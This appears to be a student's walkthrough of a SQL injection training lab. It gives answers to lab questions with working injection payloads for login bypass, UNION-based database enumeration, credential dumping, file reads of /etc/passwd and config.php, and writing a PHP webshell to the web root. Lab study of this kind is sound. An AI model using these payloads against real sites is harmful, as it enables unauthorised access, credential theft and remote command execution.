# SQL Injection Fundamentals

## Table of Contents&#x20;

## Databases

<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

## MySQL&#x20;

### Intro to MySQL

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Connect to the database using the MySQL client from the command line. Use the 'show databases;' command to list databases in the DBMS. What is the name of the first database?**

`mysql -u root -h 83.136.251.235 -P 44245 -p`

* PW: password

`show databases;`

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

### SQL Statements

**What is the department number for the 'Development' department?**

`mysql -u root -h 94.237.56.188 -P 32521 -p`

`show databases;`

`use employees;`

`show tables;`

`select * from departments;`

<figure><img src=".gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

### Query Results

**What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01?**

* same IP, same DB, lets continue

`select * from employees where first_name like 'Bar%';`

<figure><img src=".gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

### SQL Operators

**In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?**

* same IP, same DB, lets continue

`show columns from titles;`

`select * from titles where emp_no > 10000 or title != 'engineer';`

<figure><img src=".gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

## SQL Injections

<figure><img src=".gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

### Subverting Query logic

**Try to log in as the user 'tom'. What is the flag value shown after you successfully log in?**

UN: `tom'OR'1'='1`

PW: anything...

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Using Comments

**Login as the user with the id 5 to get the flag.**

UN: `or id = 5 ) #`

PW: anything...

<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### Union Clause

**Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.**

`mysql -u root -h 83.136.251.235 -P 47496 -p`

`show databases;`

`use employees;`

`select * from employees UNION select dept_no, dept_name, 3, 4, 5, 6 from departments;`

<figure><img src=".gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

### Union Injection

* we can detect number of columns
  * using ORDER BY or UNION
    * ' order by 1-- -
    * cn' UNION select 1,2,3-- -
      * cn' UNION select 1,@@version,3,4-- -
        *

            <figure><img src=".gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>



**Use a Union injection to get the result of 'user()'**

* go to given URL
* replicate the last example
* `cn' UNION select 1,user(),3,4-- -`

<figure><img src=".gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

## Exploitation

### DB Enumeration

**What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?**

`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`

<figure><img src=".gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

`cn' UNION select 1,database(),2,3-- -`

<figure><img src=".gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`

<figure><img src=".gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

<figure><img src=".gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

`cn' UNION select 1, username, password, 4 from dev.credentials-- -`

<figure><img src=".gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

`cn' UNION select 1, username, password, 4 from`` `**`users`**`-- -`

<figure><img src=".gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

### Reading Files

**We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.**

`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`

<figure><img src=".gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

<figure><img src=".gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

* inspect soucre code
  * config.php

<figure><img src=".gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/`**`config.php`**`"), 3, 4-- -`

<figure><img src=".gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

### Writing Files&#x20;

**Find the flag by using a webshell.**

* HINT: Its one directoy away from you

`<?php system($_REQUEST[0]); ?>`

`cn' union select "",'', "", "" into outfile '/var/www/html/shell.php'-- -`

URL: [http://83.136.251.235:41930/shell.php?0=id](http://83.136.251.235:41930/shell.php?0=id)

<figure><img src=".gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

<figure><img src=".gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

cn' union select "",'', "", "" into outfile '/var/www/html/shell2.php'-- -

## Mitigations&#x20;

## Closing it Out

### Skills Assessment - SQL Injection Fundamentals
